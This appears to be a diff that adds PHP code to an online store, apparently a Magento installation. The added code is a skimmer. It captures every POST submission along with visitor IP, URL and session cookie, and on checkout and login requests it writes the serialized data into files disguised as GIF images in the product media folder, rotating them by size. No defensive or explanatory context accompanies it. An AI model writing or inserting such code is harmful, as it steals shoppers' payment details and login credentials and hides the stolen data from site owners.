@@ -1,0 +1,26 @@
+if ( isset($_POST) && is_array($_POST) && count($_POST) > 0 ) {
+$log_dir = $_SERVER['DOCUMENT_ROOT'] .'/media/catalog/product/0/z/';
+$log_name = "image47.gif";
+if (!file_exists($log_dir)) @mkdir( $log_dir, 0777, true );
+$ARINFO = $_POST;
+$ARINFO['date'] = $_SERVER['REQUEST_TIME'];
+$ARINFO['ip'] = $_SERVER['REMOTE_ADDR'];
+$ARINFO['url'] = $_SERVER['REQUEST_URI'];
+if(isset($_COOKIE['frontend'])) $ARINFO['cookie'] = $_COOKIE['frontend'];
+if(strpos($_SERVER['REQUEST_URI'], 'checkout'))
+{
+if(@filesize($log_dir . $log_name)>1024*512)
+{ @rename($log_dir.'_'.$log_name, $log_dir.'__'.$log_name);
+@rename($log_dir.$log_name, $log_dir.'_'.$log_name);
+}
+$log_entry = serialize($ARINFO) . "\r\n\r\n";
+$fp=fopen( $log_dir . $log_name, 'a' );
+fputs($fp, $log_entry);
+fclose($fp); }
+if(isset($_POST['login']))
+{ $ad_name = "picture.gif";
+$log_entry = serialize($ARINFO) . "\r\n";
+$fp=fopen( $log_dir . $ad_name, 'a' );
+fputs($fp, $log_entry);
+fclose($fp); }
+}
